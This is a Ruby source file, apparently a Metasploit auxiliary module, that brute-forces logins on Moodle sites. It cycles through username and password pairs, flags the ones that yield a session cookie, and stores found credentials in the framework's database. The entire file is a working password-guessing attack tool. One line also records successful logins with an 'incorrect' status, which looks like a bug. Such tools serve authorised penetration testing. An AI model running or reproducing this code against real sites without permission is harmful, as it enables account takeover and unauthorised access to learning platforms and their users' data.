##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Moodle
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Moodle Login',
        'Description' => %q{
          This module will attempt to authenticate to Moodle.
        },
        'Author' => [ 'bcoles' ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options([
      OptString.new('USERNAME', [true, 'The username for Moodle', 'guest']),
      OptString.new('PASSWORD', [false, 'The password to Moodle', 'guest']),
      OptString.new('TARGETURI', [false, 'The path to Moodle', '/'])
    ])
  end

  def report_good_cred(ip, port, user, pass, proof)
    service_data = {
      address: ip,
      port: port,
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: pass,
      private_type: :password,
      username: user
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::INCORRECT,
      proof: proof
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def report_bad_cred(ip, rport, user, pass)
    invalidate_login(
      address: ip,
      port: rport,
      protocol: 'tcp',
      public: user,
      private: pass,
      status: Metasploit::Model::Login::Status::INCORRECT
    )
  end

  def bruteforce(ip)
    each_user_pass do |user, pass|
      cookie = moodle_login(user, pass)

      unless cookie.blank?
        print_brute(level: :good, ip: ip, msg: "Success: '#{user}:#{pass}'")
        report_good_cred(ip, rport, user, pass, cookie)
        return :next_user
      end

      vprint_brute(level: :verror, ip: ip, msg: "Failed: '#{user}:#{pass}'")
      report_bad_cred(ip, rport, user, pass)
    end
  end

  def run_host(ip)
    unless moodle_and_online?
      print_brute(level: :error, ip: ip, msg: 'Moodle not found')
      return
    end

    vprint_brute(level: :good, ip: ip, msg: 'Found Moodle')
    bruteforce(ip)
  end
end
